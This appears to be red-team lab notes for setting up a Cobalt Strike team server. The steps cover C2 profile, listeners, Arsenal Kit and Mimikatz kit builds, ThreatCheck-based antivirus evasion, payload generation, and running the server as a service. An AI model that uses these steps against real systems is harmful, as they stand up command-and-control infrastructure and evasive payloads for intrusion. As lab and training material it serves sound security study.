## Team Server Setup Steps 

1. Edit c2-profile
```
cd cobaltstrike/c2-profiles/normal/
cat webbug.profile
```

2. Start the Team Server
```
cd cobaltstrike
sudo ./teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile
```

3. Set up listeners
```
ls \\.\pipe\ 
http > Beacon HTTP > hostname> > hostname> > 80
smb > Beacon SMB > pipename (C2)
tcp > Beacon TCP > 4444
tcp-local > Beacon TCP > 4444 > bind to localhost only 
```
  
4. Build the Artifact, Resource, and Mimikatz kits
```
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobaltstrike/artifacts

cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resources
./build.sh /mnt/c/Tools/cobaltstrike/resources

cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/mimikatz
./build.sh /mnt/c/Tools/cobaltstrike/mimikatz
```

5. Clean Arsenal Kit (ThreatCheck)
```
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\artifacts\pipe\artifact64svcbig.exe
```

6. Repeat Step 4
   
7. Load the Aggressor Scripts
`artifact.cna`, `resources.cna`, `mimikatz.cna`, `dcom.cna` 

8. Generate Payloads
```
Folder: C:\Payloads
HTTP Library: wininet
```

9. Remove junk lines from .ps1 payloads

10. Run the Team Server as Service (Optional)
```
sudo vim /etc/systemd/system/teamserver.service

[Unit]
Description=Cobalt Strike Team Server
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
WorkingDirectory=/home/attacker/cobaltstrike
ExecStart=/home/attacker/cobaltstrike/teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile

[Install]
WantedBy=multi-user.target
```
```
sudo systemctl daemon-reload
sudo systemctl start teamserver.service
sudo systemctl status teamserver.service
sudo systemctl enable teamserver.service
```
